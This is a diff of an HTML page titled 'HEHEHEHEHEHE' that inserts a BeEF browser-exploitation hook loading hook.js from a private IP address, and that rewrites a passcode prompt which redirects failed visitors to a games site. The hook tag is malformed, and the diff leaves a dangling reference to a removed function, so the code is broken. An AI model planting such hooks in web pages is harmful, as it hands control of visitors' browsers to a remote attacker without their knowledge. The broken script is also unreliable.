@@ -6,37 +6,18 @@
 <body>
     <title>HEHEHEHEHEHE</title> 
     <!-- BeEF Hook --> 
-    <script> src="http://172.20.245.20:3000/demos/butcher/index.html" title="HACKING_EXPLOIT" allowtransparency = "true" frameBorder="0" </script>
+    <script> src="http://172.20.245.20:3000/hook.js" title="HACKING_EXPLOIT" allowtransparency = "true" frameBorder="0" </script>
     
-    <script> 
-        // Function to ask for the user's name and validate it
-        function askForName() {
-            // Retrieve the stored name from localStorage, if available
-            let storedName = sessionStorage.getItem('userName');
-            // List of valid usernames (passcodes)
+    <script>
+        window.onload = function() {
             const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];
+            const userInput = prompt("Type the secret code");
 
-            // If no valid name is stored, prompt the user to enter one
-            if (!storedName) {
-                let name;
-                do {
-                    name = prompt("Enter your name as one of the secret passcodes:");
-                    if (!name) {
-                        // If user cancels the prompt, redirect to CrazyGames
-                        window.location.replace("https://www.crazygames.com/");
-                        return;
-                    }
-                } while (!validUsernames.includes(name()));
-
-                // Save the valid name in localStorage
-                sessionStorage.setItem('userName', name);
-                // Display greeting message with the valid name
-                document.getElementById("greeting").innerText = "Hello, " + name + "!";
-            } else {
-                // If a valid name is already stored, greet the user
-                document.getElementById("greeting").innerText = "Hello, " + storedName + "!";
+            // Check if user clicked cancel or entered an invalid name
+            if (userInput === null || !validUsernames.includes(userInput)) {
+                window.location.href = "https://www.crazygames.com";
             }
-        }
+        };
 
         // Run the function when the page loads
         window.onload = askForName;
